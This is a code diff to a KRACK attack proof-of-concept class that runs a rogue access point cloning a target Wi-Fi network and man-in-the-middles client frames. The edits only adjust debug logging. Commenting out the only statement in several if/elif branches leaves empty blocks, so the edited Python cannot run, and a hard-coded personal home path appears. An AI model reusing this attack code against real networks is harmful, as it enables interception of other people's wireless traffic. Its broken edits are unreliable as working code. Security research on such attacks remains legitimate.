@@ -640,6 +640,7 @@ class KRAckAttack():
 		p = self.sock_real.recv()
 		if p == None: return
 
+		print_rx(INFO, "debug: ", p)
 		# 1. Handle frames sent TO the real AP
 		if p.addr1 == self.apmac:
 			# If it's an authentication to the real AP, always display it ...
@@ -739,10 +740,10 @@ class KRAckAttack():
 				self.last_rogue_beacon = time.time()
 			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p)
+				# print_rx(INFO, "Rogue channel", p) -- debug
 			# And display all frames sent to a MitM'ed client
 			elif p.addr1 in self.clients:
-				print_rx(INFO, "Rogue channel", p)
+				# print_rx(INFO, "Rogue channel", p) -- debug
 
 		# 2. Handle frames sent TO the AP
 		elif p.addr1 == self.apmac:
@@ -762,7 +763,7 @@ class KRAckAttack():
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p)
+				# print_rx(INFO, "Rogue channel", p) -- debug
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
@@ -789,8 +790,8 @@ class KRAckAttack():
 
 
 		# 3. Always display all frames sent by or to the targeted client
-		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Rogue channel", p)
+		# elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
+			# print_rx(INFO, "Rogue channel", p) -- debug
 
 	def handle_hostapd_out(self):
 		# hostapd always prints lines so this should not block
@@ -893,7 +894,7 @@ class KRAckAttack():
 		# 	bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
 		# bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
 		# self.sock_real.attach_filter(bpf)
-		# self.sock_rogue.attach_filter(bpf)
+		# self.sock_rogue.attach_filter(bpf)-- debug
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
